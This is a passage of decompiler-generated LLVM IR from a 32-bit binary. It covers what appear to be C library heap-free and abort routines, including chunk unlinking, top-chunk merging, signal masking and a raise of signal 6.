  uselistorder label %dec_label_pc_80501dd, { 1, 0 }
  uselistorder label %dec_label_pc_80501bd, { 1, 0 }
  uselistorder label %dec_label_pc_8050189, { 1, 0 }
  uselistorder label %dec_label_pc_8050181, { 1, 0 }
  uselistorder label %dec_label_pc_805014c, { 1, 0 }
}

define i32 @function_8050259(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050259:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8050259 = load i32, i32* @ebp, align 4
  %v0_805025b = load i32, i32* @esi, align 4
  %v0_805025c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8050264 = icmp eq i32 %arg1, 0
  br i1 %v1_8050264, label %dec_label_pc_80503ed, label %dec_label_pc_805026c

dec_label_pc_805026c:                             ; preds = %dec_label_pc_8050259
  %v2_8050277 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050277, i32* @eax, align 4
  %v2_805027c = call i32 @function_8050de2(i32 %v2_8050277, i32 134548959)
  store i32 %v2_805027c, i32* %eax.global-to-local, align 4
  %v1_8050288 = call i32 @function_8050ddf(i32 ptrtoint (i32* @global_var_80552f0.54 to i32))
  %v1_805028d = add i32 %arg1, -8
  store i32 %v1_805028d, i32* @ecx, align 4
  %v0_8050290 = load i8, i8* @global_var_805b540.55, align 1
  %v1_8050290 = sext i8 %v0_8050290 to i32
  store i32 %v1_8050290, i32* %eax.global-to-local, align 4
  %v1_8050298 = add i32 %arg1, -4
  %v2_8050298 = inttoptr i32 %v1_8050298 to i32*
  %v3_8050298 = load i32, i32* %v2_8050298, align 4
  store i32 %v3_8050298, i32* %edx.global-to-local, align 4
  %v1_805029d = and i32 %v3_8050298, -4
  %v4_805029d = trunc i32 %v1_805029d to i8
  store i32 %v1_805029d, i32* @ebx, align 4
  %v8_80502a2 = icmp ugt i8 %v4_805029d, %v0_8050290
  br i1 %v8_80502a2, label %dec_label_pc_80502c4, label %dec_label_pc_80502a4

dec_label_pc_80502a4:                             ; preds = %dec_label_pc_805026c
  %v2_80502a4 = udiv i32 %v3_8050298, 8
  %v1_80502a7 = or i32 %v1_8050290, 3
  %v3_80502a7 = trunc i32 %v1_80502a7 to i8
  store i32 %v1_80502a7, i32* %eax.global-to-local, align 4
  store i8 %v3_80502a7, i8* @global_var_805b540.55, align 64
  %v1_80502af = mul nuw i32 %v2_80502a4, 4
  %v2_80502af = add i32 %v1_80502af, ptrtoint (i8* @global_var_805b540.55 to i32)
  store i32 %v2_80502af, i32* %edx.global-to-local, align 4
  %v1_80502b6 = add i32 %v1_80502af, add (i32 ptrtoint (i8* @global_var_805b540.55 to i32), i32 -4)
  %v2_80502b6 = inttoptr i32 %v1_80502b6 to i32*
  %v3_80502b6 = load i32, i32* %v2_80502b6, align 4
  store i32 %v3_80502b6, i32* %eax.global-to-local, align 4
  %v3_80502b9 = inttoptr i32 %arg1 to i32*
  store i32 %v3_80502b6, i32* %v3_80502b9, align 4
  %v0_80502bc = load i32, i32* @ecx, align 4
  %v1_80502bc = load i32, i32* %edx.global-to-local, align 4
  %v2_80502bc = add i32 %v1_80502bc, -4
  %v3_80502bc = inttoptr i32 %v2_80502bc to i32*
  store i32 %v0_80502bc, i32* %v3_80502bc, align 4
  br label %dec_label_pc_80503dc

dec_label_pc_80502c4:                             ; preds = %dec_label_pc_805026c
  %v1_80502c4 = trunc i32 %v3_8050298 to i8
  %v2_80502c4 = and i8 %v1_80502c4, 2
  %v3_80502c4 = icmp eq i8 %v2_80502c4, 0
  %v5_80502c4 = zext i8 %v2_80502c4 to i32
  %v7_80502c4 = and i32 %v3_8050298, -256
  %v8_80502c4 = or i32 %v5_80502c4, %v7_80502c4
  store i32 %v8_80502c4, i32* %edx.global-to-local, align 4
  %v1_80502c7 = icmp eq i1 %v3_80502c4, false
  br i1 %v1_80502c7, label %dec_label_pc_80503bc, label %dec_label_pc_80502cd

dec_label_pc_80502cd:                             ; preds = %dec_label_pc_80502c4
  %v1_80502cd = or i32 %v1_8050290, 1
  %v3_80502cd = trunc i32 %v1_80502cd to i8
  store i32 %v1_80502cd, i32* %eax.global-to-local, align 4
  %v2_80502d0 = add i32 %v1_805029d, %v1_805028d
  store i32 %v2_80502d0, i32* @esi, align 4
  store i8 %v3_80502cd, i8* @global_var_805b540.55, align 64
  %v1_80502d8 = add i32 %v2_80502d0, 4
  %v2_80502d8 = inttoptr i32 %v1_80502d8 to i32*
  %v3_80502d8 = load i32, i32* %v2_80502d8, align 4
  store i32 %v3_80502d8, i32* %eax.global-to-local, align 4
  %v2_80502df = inttoptr i32 %v1_8050298 to i8*
  %v3_80502df = load i8, i8* %v2_80502df, align 1
  %v4_80502df = urem i8 %v3_80502df, 2
  %v5_80502df = icmp eq i8 %v4_80502df, 0
  %v1_80502e3 = icmp eq i1 %v5_80502df, false
  br i1 %v1_80502e3, label %dec_label_pc_8050306, label %dec_label_pc_80502e5

dec_label_pc_80502e5:                             ; preds = %dec_label_pc_80502cd
  %v2_80502e5 = inttoptr i32 %v1_805028d to i32*
  %v3_80502e5 = load i32, i32* %v2_80502e5, align 4
  store i32 %v3_80502e5, i32* @ebp, align 4
  %v2_80502ea = sub i32 %v1_805028d, %v3_80502e5
  store i32 %v2_80502ea, i32* %eax.global-to-local, align 4
  %v1_80502ec = add i32 %v2_80502ea, 8
  %v2_80502ec = inttoptr i32 %v1_80502ec to i32*
  %v3_80502ec = load i32, i32* %v2_80502ec, align 4
  store i32 %v3_80502ec, i32* @edi, align 4
  %v1_80502ef = add i32 %v2_80502ea, 12
  %v2_80502ef = inttoptr i32 %v1_80502ef to i32*
  %v3_80502ef = load i32, i32* %v2_80502ef, align 4
  store i32 %v3_80502ef, i32* %edx.global-to-local, align 4
  %v1_80502f2 = add i32 %v3_80502ec, 12
  %v2_80502f2 = inttoptr i32 %v1_80502f2 to i32*
  %v3_80502f2 = load i32, i32* %v2_80502f2, align 4
  store i32 %v3_80502f2, i32* @ecx, align 4
  %v12_80502f5 = icmp eq i32 %v3_80502f2, %v2_80502ea
  %v1_80502f7 = icmp eq i1 %v12_80502f5, false
  br i1 %v1_80502f7, label %dec_label_pc_8050335, label %dec_label_pc_80502f9

dec_label_pc_80502f9:                             ; preds = %dec_label_pc_80502e5
  %v1_80502f9 = add i32 %v3_80502ef, 8
  %v2_80502f9 = inttoptr i32 %v1_80502f9 to i32*
  %v3_80502f9 = load i32, i32* %v2_80502f9, align 4
  %v15_80502f9 = icmp eq i32 %v3_80502f9, %v3_80502f2
  %v1_80502fc = icmp eq i1 %v15_80502f9, false
  br i1 %v1_80502fc, label %dec_label_pc_8050335, label %dec_label_pc_80502fe

dec_label_pc_80502fe:                             ; preds = %dec_label_pc_80502f9
  %v2_80502fe = add i32 %v3_80502e5, %v1_805029d
  store i32 %v2_80502fe, i32* @ebx, align 4
  store i32 %v3_80502ef, i32* %v2_80502f2, align 4
  %v0_8050303 = load i32, i32* @edi, align 4
  %v1_8050303 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050303 = add i32 %v1_8050303, 8
  %v3_8050303 = inttoptr i32 %v2_8050303 to i32*
  store i32 %v0_8050303, i32* %v3_8050303, align 4
  %v0_805030d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050306

dec_label_pc_8050306:                             ; preds = %dec_label_pc_80502cd, %dec_label_pc_80502fe
  %v1_8050319 = phi i32 [ %v2_80502d0, %dec_label_pc_80502cd ], [ %v0_805030d.pre, %dec_label_pc_80502fe ]
  %v1_805030a = and i32 %v3_80502d8, -4
  store i32 %v1_805030a, i32* @ebp, align 4
  %v1_805030d = load i32, i32* @global_var_805b56c.56, align 4
  %v12_805030d = icmp eq i32 %v1_8050319, %v1_805030d
  br i1 %v12_805030d, label %dec_label_pc_8050367, label %dec_label_pc_8050315

dec_label_pc_8050315:                             ; preds = %dec_label_pc_8050306
  %v2_8050315 = add i32 %v1_8050319, 4
  %v3_8050315 = add i32 %v2_8050315, %v1_805030a
  %v4_8050315 = inttoptr i32 %v3_8050315 to i32*
  %v5_8050315 = load i32, i32* %v4_8050315, align 4
  store i32 %v5_8050315, i32* %eax.global-to-local, align 4
  %v3_8050319 = inttoptr i32 %v2_8050315 to i32*
  store i32 %v1_805030a, i32* %v3_8050319, align 4
  %v0_805031c = load i32, i32* %eax.global-to-local, align 4
  %v1_805031c = urem i32 %v0_805031c, 2
  %v2_805031c = icmp eq i32 %v1_805031c, 0
  store i32 %v1_805031c, i32* %eax.global-to-local, align 4
  %v1_8050321 = icmp eq i1 %v2_805031c, false
  br i1 %v1_8050321, label %dec_label_pc_8050342, label %dec_label_pc_8050323

dec_label_pc_8050323:                             ; preds = %dec_label_pc_8050315
  %v0_8050323 = load i32, i32* @esi, align 4
  %v1_8050323 = add i32 %v0_8050323, 8
  %v2_8050323 = inttoptr i32 %v1_8050323 to i32*
  %v3_8050323 = load i32, i32* %v2_8050323, align 4
  store i32 %v3_8050323, i32* @edx, align 4
  %v1_8050326 = add i32 %v0_8050323, 12
  %v2_8050326 = inttoptr i32 %v1_8050326 to i32*
  %v3_8050326 = load i32, i32* %v2_8050326, align 4
  store i32 %v3_8050326, i32* %eax.global-to-local, align 4
  %v1_8050329 = add i32 %v3_8050323, 12
  %v2_8050329 = inttoptr i32 %v1_8050329 to i32*
  %v3_8050329 = load i32, i32* %v2_8050329, align 4
  store i32 %v3_8050329, i32* @edi, align 4
  %v12_805032c = icmp eq i32 %v3_8050329, %v0_8050323
  %v1_805032e = icmp eq i1 %v12_805032c, false
  br i1 %v1_805032e, label %dec_label_pc_8050335, label %dec_label_pc_8050330

dec_label_pc_8050330:                             ; preds = %dec_label_pc_8050323
  %v1_8050330 = add i32 %v3_8050326, 8
  %v2_8050330 = inttoptr i32 %v1_8050330 to i32*
  %v3_8050330 = load i32, i32* %v2_8050330, align 4
  %v15_8050330 = icmp eq i32 %v3_8050330, %v3_8050329
  br i1 %v15_8050330, label %dec_label_pc_805033a, label %dec_label_pc_8050335

dec_label_pc_8050335:                             ; preds = %dec_label_pc_8050330, %dec_label_pc_8050323, %dec_label_pc_80502f9, %dec_label_pc_80502e5
  %v0_8050335 = call i32 @function_8050418()
  store i32 %v0_8050335, i32* %eax.global-to-local, align 4
  %v1_805033a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805033a

dec_label_pc_805033a:                             ; preds = %dec_label_pc_8050330, %dec_label_pc_8050335
  %v1_805033a = phi i32 [ %v3_8050323, %dec_label_pc_8050330 ], [ %v1_805033a.pre, %dec_label_pc_8050335 ]
  %v0_805033a = phi i32 [ %v3_8050326, %dec_label_pc_8050330 ], [ %v0_8050335, %dec_label_pc_8050335 ]
  %v2_805033a = add i32 %v1_805033a, 12
  %v3_805033a = inttoptr i32 %v2_805033a to i32*
  store i32 %v0_805033a, i32* %v3_805033a, align 4
  %v0_805033d = load i32, i32* @edx, align 4
  %v1_805033d = load i32, i32* %eax.global-to-local, align 4
  %v2_805033d = add i32 %v1_805033d, 8
  %v3_805033d = inttoptr i32 %v2_805033d to i32*
  store i32 %v0_805033d, i32* %v3_805033d, align 4
  %v0_8050340 = load i32, i32* @ebx, align 4
  %v1_8050340 = load i32, i32* @ebp, align 4
  %v2_8050340 = add i32 %v1_8050340, %v0_8050340
  store i32 %v2_8050340, i32* @ebx, align 4
  br label %dec_label_pc_8050342

dec_label_pc_8050342:                             ; preds = %dec_label_pc_8050315, %dec_label_pc_805033a
  %v0_8050342 = load i32, i32* @global_var_805b57c.74, align 4
  store i32 %v0_8050342, i32* %eax.global-to-local, align 4
  %v0_8050347 = load i32, i32* @ecx, align 4
  %v1_8050347 = add i32 %v0_8050347, 12
  %v2_8050347 = inttoptr i32 %v1_8050347 to i32*
  store i32 ptrtoint (i32* @global_var_805b574.58 to i32), i32* %v2_8050347, align 4
  %v0_805034e = load i32, i32* %eax.global-to-local, align 4
  %v1_805034e = load i32, i32* @ecx, align 4
  %v2_805034e = add i32 %v1_805034e, 8
  %v3_805034e = inttoptr i32 %v2_805034e to i32*
  store i32 %v0_805034e, i32* %v3_805034e, align 4
  %v0_8050351 = load i32, i32* @ebx, align 4
  %v1_8050351 = load i32, i32* @ecx, align 4
  %v3_8050351 = add i32 %v1_8050351, %v0_8050351
  %v4_8050351 = inttoptr i32 %v3_8050351 to i32*
  store i32 %v0_8050351, i32* %v4_8050351, align 4
  %v0_8050354 = load i32, i32* @ecx, align 4
  %v1_8050354 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050354 = add i32 %v1_8050354, 12
  %v3_8050354 = inttoptr i32 %v2_8050354 to i32*
  store i32 %v0_8050354, i32* %v3_8050354, align 4
  %v0_8050357 = load i32, i32* @ebx, align 4
  %v1_8050359 = or i32 %v0_8050357, 1
  store i32 %v1_8050359, i32* %eax.global-to-local, align 4
  %v0_805035c = load i32, i32* @ecx, align 4
  store i32 %v0_805035c, i32* @global_var_805b57c.74, align 4
  %v2_8050362 = add i32 %v0_805035c, 4
  %v3_8050362 = inttoptr i32 %v2_8050362 to i32*
  store i32 %v1_8050359, i32* %v3_8050362, align 4
  br label %dec_label_pc_8050377

dec_label_pc_8050367:                             ; preds = %dec_label_pc_8050306
  %v0_8050367 = load i32, i32* @ebx, align 4
  %v2_8050367 = add i32 %v0_8050367, %v1_805030a
  store i32 %v2_8050367, i32* @ebx, align 4
  %v1_805036b = or i32 %v2_8050367, 1
  store i32 %v1_805036b, i32* %eax.global-to-local, align 4
  %v1_805036e = load i32, i32* @ecx, align 4
  %v2_805036e = add i32 %v1_805036e, 4
  %v3_805036e = inttoptr i32 %v2_805036e to i32*
  store i32 %v1_805036b, i32* %v3_805036e, align 4
  %v0_8050371 = load i32, i32* @ecx, align 4
  store i32 %v0_8050371, i32* @global_var_805b56c.56, align 4
  br label %dec_label_pc_8050377

dec_label_pc_8050377:                             ; preds = %dec_label_pc_8050342, %dec_label_pc_8050367
  %v0_8050377 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8050377, 131072
  br i1 %tmp21, label %dec_label_pc_80503dc, label %dec_label_pc_805037f

dec_label_pc_805037f:                             ; preds = %dec_label_pc_8050377
  %v0_805037f = load i8, i8* @global_var_805b540.55, align 64
  %v1_805037f = and i8 %v0_805037f, 2
  %v2_805037f = icmp eq i8 %v1_805037f, 0
  br i1 %v2_805037f, label %dec_label_pc_8050398, label %dec_label_pc_8050388

dec_label_pc_8050388:                             ; preds = %dec_label_pc_805037f
  %v2_8050390 = call i32 @function_80500b1(i32* bitcast (i8* @global_var_805b540.55 to i32*))
  store i32 %v2_8050390, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050398

dec_label_pc_8050398:                             ; preds = %dec_label_pc_805037f, %dec_label_pc_8050388
  %v0_8050398 = load i32, i32* @global_var_805b56c.56, align 4
  store i32 %v0_8050398, i32* %eax.global-to-local, align 4
  %v1_805039d = add i32 %v0_8050398, 4
  %v2_805039d = inttoptr i32 %v1_805039d to i32*
  %v3_805039d = load i32, i32* %v2_805039d, align 4
  %v1_80503a0 = and i32 %v3_805039d, -4
  store i32 %v1_80503a0, i32* %eax.global-to-local, align 4
  %v1_80503a3 = load i32, i32* @global_var_805b884.72, align 4
  %v7_80503a3 = icmp ult i32 %v1_80503a0, %v1_80503a3
  br i1 %v7_80503a3, label %dec_label_pc_80503dc, label %dec_label_pc_80503ab

dec_label_pc_80503ab:                             ; preds = %dec_label_pc_8050398
  store i32 ptrtoint (i8* @global_var_805b540.55 to i32), i32* @edx, align 4
  %v0_80503b0 = load i32, i32* @global_var_805b888.70, align 8
  store i32 %v0_80503b0, i32* @eax, align 4
  %v0_80503b5 = call i32 @function_8050024()
  store i32 %v0_80503b5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80503dc

dec_label_pc_80503bc:                             ; preds = %dec_label_pc_80502c4
  %v2_80503bc = inttoptr i32 %v1_805028d to i32*
  %v3_80503bc = load i32, i32* %v2_80503bc, align 4
  store i32 %v3_80503bc, i32* %edx.global-to-local, align 4
  %v0_80503bf = load i32, i32* @global_var_805b890.63, align 16
  %v1_80503bf = add i32 %v0_80503bf, -1
  store i32 %v1_80503bf, i32* @global_var_805b890.63, align 16
  %v2_80503c5 = add i32 %v3_80503bc, %v1_805029d
  store i32 %v2_80503c5, i32* %eax.global-to-local, align 4
  %v2_80503c8 = sub i32 %v1_805028d, %v3_80503bc
  %v0_80503ce = load i32, i32* @global_var_805b8a4.66, align 4
  %v2_80503ce = sub i32 %v0_80503ce, %v2_80503c5
  store i32 %v2_80503ce, i32* @global_var_805b8a4.66, align 4
  %v4_80503d4 = inttoptr i32 %v2_80503c8 to i32*
  %v5_80503d4 = call i32 @function_80512bc(i32* %v4_80503d4, i32 %v2_80503c5, i32 %v1_805029d, i32 %v1_805029d)
  store i32 %v5_80503d4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80503dc

dec_label_pc_80503dc:                             ; preds = %dec_label_pc_8050398, %dec_label_pc_8050377, %dec_label_pc_80503ab, %dec_label_pc_80502a4, %dec_label_pc_80503bc
  store i32 %v2_8050277, i32* @eax, align 4
  %v2_80503e5 = call i32 @function_8050de2(i32 %v2_8050277, i32 1)
  store i32 %v2_80503e5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80503ed

dec_label_pc_80503ed:                             ; preds = %dec_label_pc_8050259, %dec_label_pc_80503dc
  %.0 = phi i32 [ undef, %dec_label_pc_8050259 ], [ %v2_80503e5, %dec_label_pc_80503dc ]
  store i32 %v0_805025c, i32* @ebx, align 4
  store i32 %v0_805025b, i32* @esi, align 4
  store i32 %v0_8050259, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_80503bc, { 1, 0, 2 }
  uselistorder i32 %v0_8050351, { 1, 0 }
  uselistorder i32 %v1_805031c, { 1, 0 }
  uselistorder i32 %v2_8050315, { 1, 0 }
  uselistorder i32 %v1_805030a, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050319, { 1, 0 }
  uselistorder i32 %v1_805029d, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8050298, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_805028d, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_805b540.55 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_805b574.58 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_805b56c.56, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_80503ed, { 1, 0 }
  uselistorder label %dec_label_pc_80503dc, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8050398, { 1, 0 }
  uselistorder label %dec_label_pc_8050377, { 1, 0 }
  uselistorder label %dec_label_pc_8050342, { 1, 0 }
  uselistorder label %dec_label_pc_805033a, { 1, 0 }
  uselistorder label %dec_label_pc_8050306, { 1, 0 }
}

define i32 @function_80503f5(i32 %arg1) local_unnamed_addr {
dec_label_pc_80503f5:
  %v0_80503f5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8050402 = call i32 @function_80500b1(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_805b540.55 to i8) to i32) to i32*))
  %v0_8050407 = load i32, i32* @ebx, align 4
  store i32 %v0_8050407, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_805b540.55 to i32), i32* @edx, align 4
  store i32 %v0_80503f5, i32* @ebx, align 4
  %v0_8050412 = call i32 @function_8050024()
  ret i32 %v0_8050412

; uselistorder directives
  uselistorder i32 ()* @function_8050024, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_805b540.55 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_805b540.55, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @function_8050418() local_unnamed_addr {
dec_label_pc_8050433.lr.ph:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8050424 = call i32 @function_8050ddf(i32 ptrtoint (i32* @global_var_8055308.75 to i32))
  %v12_805042e = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805043348 = add i32 %v12_805042e, 276
  %v5_805043349 = inttoptr i32 %v4_805043348 to i32*
  store i32 0, i32* %v5_805043349, align 4
  %v0_805043e50 = load i32, i32* %eax.global-to-local, align 4
  %v1_805043e51 = add i32 %v0_805043e50, -1
  %v9_805043e52 = icmp slt i32 %v1_805043e51, 0
  store i32 %v1_805043e51, i32* %eax.global-to-local, align 4
  %v1_805043f53 = icmp eq i1 %v9_805043e52, false
  br i1 %v1_805043f53, label %dec_label_pc_8050433.dec_label_pc_8050433_crit_edge, label %dec_label_pc_8050441

dec_label_pc_8050433.dec_label_pc_8050433_crit_edge: ; preds = %dec_label_pc_8050433.lr.ph, %dec_label_pc_8050433.dec_label_pc_8050433_crit_edge
  %v1_805043e54 = phi i32 [ %v1_805043e, %dec_label_pc_8050433.dec_label_pc_8050433_crit_edge ], [ %v1_805043e51, %dec_label_pc_8050433.lr.ph ]
  %v0_8050433.pre = load i32, i32* @esp, align 4
  %v2_8050433 = mul i32 %v1_805043e54, 4
  %v3_8050433 = add i32 %v0_8050433.pre, 152
  %v4_8050433 = add i32 %v3_8050433, %v2_8050433
  %v5_8050433 = inttoptr i32 %v4_8050433 to i32*
  store i32 0, i32* %v5_8050433, align 4
  %v0_805043e = load i32, i32* %eax.global-to-local, align 4
  %v1_805043e = add i32 %v0_805043e, -1
  %v9_805043e = icmp slt i32 %v1_805043e, 0
  store i32 %v1_805043e, i32* %eax.global-to-local, align 4
  %v1_805043f = icmp eq i1 %v9_805043e, false
  br i1 %v1_805043f, label %dec_label_pc_8050433.dec_label_pc_8050433_crit_edge, label %dec_label_pc_8050441

dec_label_pc_8050441:                             ; preds = %dec_label_pc_8050433.dec_label_pc_8050433_crit_edge, %dec_label_pc_8050433.lr.ph
  %v0_8050441 = load i32, i32* @ebx, align 4
  %v2_8050445 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8050445, i32* @ebx, align 4
  %v4_805044d = call i32 @function_804f848(i32 %v2_8050445, i32 6, i32 %v0_8050441, i32 %v0_8050441)
  store i32 %v4_805044d, i32* %eax.global-to-local, align 4
  %v1_8050455 = icmp eq i32 %v4_805044d, 0
  %v1_8050457 = icmp eq i1 %v1_8050455, false
  br i1 %v1_8050457, label %dec_label_pc_8050467, label %dec_label_pc_8050459

dec_label_pc_8050459:                             ; preds = %dec_label_pc_8050441
  %v3_805045f = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_805045f = call i32 @function_804e0dc(i32 1, %_TYPEDEF_sigset_t* %v3_805045f, i32 0)
  store i32 %v4_805045f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050467

dec_label_pc_8050467:                             ; preds = %dec_label_pc_8050441, %dec_label_pc_8050459
  %v2_805049f23 = phi i32 [ %v4_805044d, %dec_label_pc_8050441 ], [ %v4_805045f, %dec_label_pc_8050459 ]
  %v0_8050467 = load i8, i8* @global_var_805b474.76, align 4
  %v1_8050467 = icmp eq i8 %v0_8050467, 0
  %v1_805046e = icmp eq i1 %v1_8050467, false
  br i1 %v1_805046e, label %dec_label_pc_805049f, label %dec_label_pc_8050470

dec_label_pc_8050470:                             ; preds = %dec_label_pc_8050467
  store i8 1, i8* @global_var_805b474.76, align 4
  br label %dec_label_pc_8050477

dec_label_pc_8050477:                             ; preds = %dec_label_pc_80504de, %dec_label_pc_8050470
  %v1_805047f = call i32 @function_8050ddf(i32 ptrtoint (i32* @global_var_8055308.75 to i32))
  store i32 %v1_805047f, i32* %eax.global-to-local, align 4
  %v1_805048b = call i32 @function_8051fec(i32 6)
  store i32 %v1_805048b, i32* %eax.global-to-local, align 4
  %v1_8050497 = call i32 @function_8050ddf(i32 ptrtoint (i32* @global_var_8055308.75 to i32))
  store i32 %v1_8050497, i32* %eax.global-to-local, align 4
  %v0_805049f.pre = load i8, i8* @global_var_805b474.76, align 4
  br label %dec_label_pc_805049f

dec_label_pc_805049f:                             ; preds = %dec_label_pc_8050467, %dec_label_pc_8050477
  %v2_805049f = phi i32 [ %v2_805049f23, %dec_label_pc_8050467 ], [ %v1_8050497, %dec_label_pc_8050477 ]
  %v0_805049f = phi i8 [ %v0_8050467, %dec_label_pc_8050467 ], [ %v0_805049f.pre, %dec_label_pc_8050477 ]
  %v1_805049f = zext i8 %v0_805049f to i32
  %v3_805049f = and i32 %v2_805049f, -256
  %v4_805049f = or i32 %v1_805049f, %v3_805049f
  store i32 %v4_805049f, i32* %eax.global-to-local, align 4
  %v10_80504a4 = icmp eq i8 %v0_805049f, 1
  %v1_80504a6 = icmp eq i1 %v10_80504a4, false
  br i1 %v1_80504a6, label %dec_label_pc_8050500, label %dec_label_pc_80504d3.lr.ph

dec_label_pc_80504d3.lr.ph:                       ; preds = %dec_label_pc_805049f
  store i8 2, i8* @global_var_805b474.76, align 4
  %v2_80504b7 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_80504b7, i32* %eax.global-to-local, align 4
  %v3_80504bc = bitcast i32* %stack_var_-272 to i8*
  %v4_80504bc = call i32 @function_804f1d8(i8* %v3_80504bc, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_80504d340 = add i32 %v12_805042e, 140
  %v5_80504d341 = inttoptr i32 %v4_80504d340 to i32*
  store i32 -1, i32* %v5_80504d341, align 4
  %v0_80504db42 = load i32, i32* %eax.global-to-local, align 4
  %v1_80504db43 = add i32 %v0_80504db42, -1
  %v9_80504db44 = icmp slt i32 %v1_80504db43, 0
  store i32 %v1_80504db43, i32* %eax.global-to-local, align 4
  %v1_80504dc45 = icmp eq i1 %v9_80504db44, false
  br i1 %v1_80504dc45, label %dec_label_pc_80504d3.dec_label_pc_80504d3_crit_edge, label %dec_label_pc_80504de

dec_label_pc_80504d3.dec_label_pc_80504d3_crit_edge: ; preds = %dec_label_pc_80504d3.lr.ph, %dec_label_pc_80504d3.dec_label_pc_80504d3_crit_edge
  %v1_80504db46 = phi i32 [ %v1_80504db, %dec_label_pc_80504d3.dec_label_pc_80504d3_crit_edge ], [ %v1_80504db43, %dec_label_pc_80504d3.lr.ph ]
  %v0_80504d3.pre = load i32, i32* @esp, align 4
  %v2_80504d3 = mul i32 %v1_80504db46, 4
  %v3_80504d3 = add i32 %v0_80504d3.pre, 16
  %v4_80504d3 = add i32 %v3_80504d3, %v2_80504d3
  %v5_80504d3 = inttoptr i32 %v4_80504d3 to i32*
  store i32 -1, i32* %v5_80504d3, align 4
  %v0_80504db = load i32, i32* %eax.global-to-local, align 4
  %v1_80504db = add i32 %v0_80504db, -1
  %v9_80504db = icmp slt i32 %v1_80504db, 0
  store i32 %v1_80504db, i32* %eax.global-to-local, align 4
  %v1_80504dc = icmp eq i1 %v9_80504db, false
  br i1 %v1_80504dc, label %dec_label_pc_80504d3.dec_label_pc_80504d3_crit_edge, label %dec_label_pc_80504de

dec_label_pc_80504de:                             ; preds = %dec_label_pc_80504d3.dec_label_pc_80504d3_crit_edge, %dec_label_pc_80504d3.lr.ph
  %v1_80504db.lcssa = phi i32 [ %v1_80504db43, %dec_label_pc_80504d3.lr.ph ], [ %v1_80504db, %dec_label_pc_80504d3.dec_label_pc_80504d3_crit_edge ]
  store i32 %v2_80504b7, i32* %eax.global-to-local, align 4
  %v5_80504f3 = call i32 @function_805101f(i32 6, i32* nonnull %stack_var_-272, i32 0, i32 %v1_80504db.lcssa)
  store i32 %v5_80504f3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050477

dec_label_pc_8050500:                             ; preds = %dec_label_pc_805049f
  %v10_8050500 = icmp eq i8 %v0_805049f, 2
  %v1_8050502 = icmp eq i1 %v10_8050500, false
  br i1 %v1_8050502, label %dec_label_pc_805050c, label %dec_label_pc_805050c.thread

dec_label_pc_805050c.thread:                      ; preds = %dec_label_pc_8050500
  store i8 3, i8* @global_var_805b474.76, align 4
  br label %dec_label_pc_8050515

dec_label_pc_805050c:                             ; preds = %dec_label_pc_8050500
  %v9_805050c = icmp eq i8 %v0_805049f, 3
  %v1_8050513 = icmp eq i1 %v9_805050c, false
  br i1 %v1_8050513, label %dec_label_pc_8050526, label %dec_label_pc_8050515

dec_label_pc_8050515:                             ; preds = %dec_label_pc_805050c.thread, %dec_label_pc_805050c
  store i8 4, i8* @global_var_805b474.76, align 4
  %v1_8050521 = call i32 @function_804ddcc(i32 127)
  unreachable

dec_label_pc_8050526:                             ; preds = %dec_label_pc_805050c, %dec_label_pc_8050526
  br label %dec_label_pc_8050526

; uselistorder directives
  uselistorder i32 %v1_80504db, { 0, 3, 2, 1 }
  uselistorder i32 %v1_805043e, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 9, 8, 4, 0, 1, 10, 11, 12, 13, 14, 18, 15, 17, 16, 5, 2, 3 }
  uselistorder i8 4, { 2, 1, 0 }
  uselistorder i8 3, { 0, 5, 4, 1, 3, 2 }
